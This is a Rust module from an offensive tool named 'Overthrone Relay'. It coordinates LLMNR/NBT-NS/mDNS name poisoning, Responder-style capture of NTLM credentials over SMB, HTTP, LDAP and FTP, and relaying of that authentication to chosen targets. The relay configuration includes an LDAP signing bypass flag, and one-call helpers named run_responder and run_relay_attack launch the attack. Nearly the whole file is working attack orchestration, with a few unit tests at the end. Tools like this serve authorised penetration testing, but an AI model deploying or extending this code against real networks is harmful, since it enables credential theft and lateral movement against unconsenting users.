//! Overthrone Relay — NTLM Relay and Responder Framework
//!
//! Implements LLMNR/NBT-NS poisoning and NTLM relay attacks
//! for credential capture and relay to other services.

pub mod adcs_relay;
pub mod poisoner;
pub mod relay;
pub mod responder;
pub mod utils;

// Re-export types from submodules
pub use adcs_relay::{AdcsRelay, AdcsRelayConfig};
pub use relay::RelayStats;
pub use responder::CapturedCredential;
// Re-export RelayError from overthrone_core
pub use overthrone_core::error::RelayError;
use overthrone_core::error::Result;
use std::net::SocketAddr;
use tracing::info;

/// Protocol for relay targets
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Protocol {
    Smb,
    Http,
    Https,
    Ldap,
    Ldaps,
    Mssql,
}

impl std::fmt::Display for Protocol {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Smb => write!(f, "SMB"),
            Self::Http => write!(f, "HTTP"),
            Self::Https => write!(f, "HTTPS"),
            Self::Ldap => write!(f, "LDAP"),
            Self::Ldaps => write!(f, "LDAPS"),
            Self::Mssql => write!(f, "MSSQL"),
        }
    }
}

/// Attack mode for responder/relay
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AttackMode {
    Capture,
    Relay,
    SmbRelay,
    HttpRelay,
}

/// NTLM challenge structure
#[derive(Debug, Clone)]
pub struct NtlmChallenge {
    pub data: Vec<u8>,
    pub target_name: String,
}

/// NTLM response structure
#[derive(Debug, Clone)]
pub struct NtlmResponse {
    pub username: String,
    pub domain: String,
    pub lm_response: Vec<u8>,
    pub nt_response: Vec<u8>,
}

/// Relay target specification
#[derive(Debug, Clone)]
pub struct RelayTarget {
    pub address: SocketAddr,
    pub protocol: Protocol,
    pub username: Option<String>,
}

/// Main relay controller that coordinates poisoner and relay components
pub struct RelayController {
    config: RelayControllerConfig,
    poisoner: Option<poisoner::Poisoner>,
    responder: Option<responder::Responder>,
    relay: Option<relay::NtlmRelay>,
}

#[derive(Debug, Clone)]
pub struct RelayControllerConfig {
    /// Interface to listen on (e.g., "eth0", "0.0.0.0")
    pub interface: String,
    /// Enable LLMNR poisoning
    pub llmnr: bool,
    /// Enable NBT-NS poisoning
    pub nbtns: bool,
    /// Enable mDNS poisoning
    pub mdns: bool,
    /// Enable responder for credential capture
    pub responder: bool,
    /// Enable relay to targets
    pub relay_targets: Vec<RelayTarget>,
    /// Challenge to use for NTLM authentication (hex string)
    pub challenge: Option<String>,
    /// WPAD proxy script to serve
    pub wpad_script: Option<String>,
    /// Force authentication downgrade
    pub downgrade_auth: bool,
}

impl Default for RelayControllerConfig {
    fn default() -> Self {
        Self {
            interface: "0.0.0.0".to_string(),
            llmnr: true,
            nbtns: true,
            mdns: false,
            responder: true,
            relay_targets: Vec::new(),
            challenge: None,
            wpad_script: None,
            downgrade_auth: false,
        }
    }
}

impl RelayController {
    /// Create a new relay controller with the given configuration
    pub fn new(config: RelayControllerConfig) -> Self {
        Self {
            config,
            poisoner: None,
            responder: None,
            relay: None,
        }
    }

    /// Initialize all components based on configuration
    pub async fn initialize(&mut self) -> Result<()> {
        info!(
            "Initializing relay controller on interface: {}",
            self.config.interface
        );

        // Initialize poisoner if enabled
        if self.config.llmnr || self.config.nbtns || self.config.mdns {
            let poisoner_config = poisoner::PoisonerConfig {
                listen_ip: self.config.interface.clone(),
                poison_ip: self.config.interface.clone(),
                attack_mode: AttackMode::Capture,
                timeout: 30,
                llmnr: self.config.llmnr,
                nbtns: self.config.nbtns,
                mdns: self.config.mdns,
                analyze_only: false,
                target_hosts: Vec::new(),
            };
            self.poisoner = Some(poisoner::Poisoner::new(poisoner_config)?);
            info!("Poisoner initialized");
        }

        // Initialize responder if enabled
        if self.config.responder {
            let responder_config = responder::ResponderConfig {
                listen_ip: self.config.interface.clone(),
                challenge: self.config.challenge.clone(),
                http: true,
                smb: true,
                ldap: true,
                ftp: true,
            };
            self.responder = Some(responder::Responder::new(responder_config));
            info!("Responder initialized for credential capture");
        }

        // Initialize relay if targets specified
        if !self.config.relay_targets.is_empty() {
            let relay_config = relay::RelayConfig {
                listen_ip: self.config.interface.clone(),
                targets: self.config.relay_targets.clone(),
                round_robin: true,
                remove_on_success: true,
                timeout_secs: 30,
                ldap_signing_bypass: true,
            };
            self.relay = Some(relay::NtlmRelay::new(relay_config));
            info!(
                "NTLM relay initialized with {} target(s)",
                self.config.relay_targets.len()
            );
        }

        Ok(())
    }

    /// Start all enabled services
    pub async fn start(&mut self) -> Result<()> {
        info!("Starting relay controller services...");

        if let Some(ref mut poisoner) = self.poisoner {
            poisoner.start().await?;
            info!("Poisoner started");
        }

        if let Some(ref mut responder) = self.responder {
            responder.start().await?;
            info!("Responder started");
        }

        if let Some(ref mut relay) = self.relay {
            relay.start().await?;
            info!("NTLM relay started");
        }

        info!("All services started successfully");
        Ok(())
    }

    /// Stop all services
    pub async fn stop(&mut self) -> Result<()> {
        info!("Stopping relay controller services...");

        if let Some(ref mut poisoner) = self.poisoner {
            poisoner.stop().await?;
        }

        if let Some(ref mut responder) = self.responder {
            responder.stop().await?;
        }

        if let Some(ref mut relay) = self.relay {
            relay.stop().await?;
        }

        info!("All services stopped");
        Ok(())
    }

    /// Get captured credentials from responder
    pub fn get_captured_credentials(&self) -> Vec<CapturedCredential> {
        if let Some(ref responder) = self.responder {
            responder.get_captured_credentials()
        } else {
            Vec::new()
        }
    }

    /// Get relay statistics
    pub fn get_relay_stats(&self) -> RelayStats {
        if let Some(ref relay) = self.relay {
            relay.get_stats()
        } else {
            RelayStats::default()
        }
    }
}

/// Quick start function for common use case (poison + capture)
pub async fn run_responder(interface: &str, challenge: Option<&str>) -> Result<RelayController> {
    let config = RelayControllerConfig {
        interface: interface.to_string(),
        llmnr: true,
        nbtns: true,
        mdns: false,
        responder: true,
        relay_targets: Vec::new(),
        challenge: challenge.map(|s| s.to_string()),
        wpad_script: None,
        downgrade_auth: false,
    };

    let mut controller = RelayController::new(config);
    controller.initialize().await?;
    controller.start().await?;

    Ok(controller)
}

/// Run full relay attack (poison + capture + relay)
pub async fn run_relay_attack(
    interface: &str,
    targets: Vec<RelayTarget>,
    challenge: Option<&str>,
) -> Result<RelayController> {
    let config = RelayControllerConfig {
        interface: interface.to_string(),
        llmnr: true,
        nbtns: true,
        mdns: false,
        responder: true,
        relay_targets: targets,
        challenge: challenge.map(|s| s.to_string()),
        wpad_script: None,
        downgrade_auth: false,
    };

    let mut controller = RelayController::new(config);
    controller.initialize().await?;
    controller.start().await?;

    Ok(controller)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_relay_controller_config_default() {
        let config = RelayControllerConfig::default();
        assert_eq!(config.interface, "0.0.0.0");
        assert!(config.llmnr);
        assert!(config.nbtns);
        assert!(!config.mdns);
        assert!(config.responder);
        assert!(config.relay_targets.is_empty());
    }

    #[test]
    fn test_relay_stats_default() {
        let stats = RelayStats::default();
        assert_eq!(stats.successful_relays, 0);
        assert_eq!(stats.failed_relays, 0);
        assert_eq!(stats.active_connections, 0);
        assert_eq!(stats.total_attempts, 0);
    }

    #[test]
    fn test_protocol_display() {
        assert_eq!(Protocol::Smb.to_string(), "SMB");
        assert_eq!(Protocol::Http.to_string(), "HTTP");
        assert_eq!(Protocol::Https.to_string(), "HTTPS");
    }
}
